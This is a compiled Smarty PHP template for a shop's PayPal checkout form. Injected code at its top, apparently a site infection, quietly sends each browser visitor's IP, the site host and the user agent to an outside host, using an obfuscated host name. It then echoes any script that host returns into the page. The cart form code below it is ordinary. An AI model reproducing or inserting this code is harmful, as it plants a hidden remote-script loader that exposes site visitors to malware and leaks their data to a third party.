<?php /* Smarty version 2.6.22, created on 2009-03-12 17:50:29
         compiled from /home/a1425978/public_html//templates/check_out.html */ ?>
<?php
#19f955#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/19f955#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php if (! $this->_tpl_vars['paypal_test']): ?>
	<form action="https://www.paypal.com/cgi-bin/webscr/" method="POST" >
<?php else: ?>
	<form action="https://www.sandbox.paypal.com/cgi-bin/webscr/" method="POST" >
<?php endif; ?>
<input type="hidden" name="cmd" value="_cart">
<input type="hidden" name="business" value="<?php echo $this->_tpl_vars['admin_email']; ?>
">
<input type="hidden" name="item_name" value="Item Name">
<input type="hidden" name="currency_code" value="USD">
<input type="hidden" name="amount" value="<?php echo $this->_tpl_vars['subtotal']; ?>
">
<input type="hidden" name="upload" value="1">


<?php $_from = $this->_tpl_vars['cart']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }$this->_foreach['paypal_cart'] = array('total' => count($_from), 'iteration' => 0);
if ($this->_foreach['paypal_cart']['total'] > 0):
    foreach ($_from as $this->_tpl_vars['item']):
        $this->_foreach['paypal_cart']['iteration']++;
?>
	<input type = "hidden" name ="item_name_<?php echo $this->_foreach['paypal_cart']['iteration']; ?>
" value="<?php echo $this->_tpl_vars['item']['name']; ?>
">
	<input type = "hidden" name ="amount_<?php echo $this->_foreach['paypal_cart']['iteration']; ?>
" value="<?php echo $this->_tpl_vars['item']['price']; ?>
">
	<input type = "hidden" name ="item_number_<?php echo $this->_foreach['paypal_cart']['iteration']; ?>
" value ="<?php echo $this->_tpl_vars['item']['id']; ?>
">
<?php endforeach; endif; unset($_from); ?>
<input type="submit" value="Proceed to PayPal" />
</form>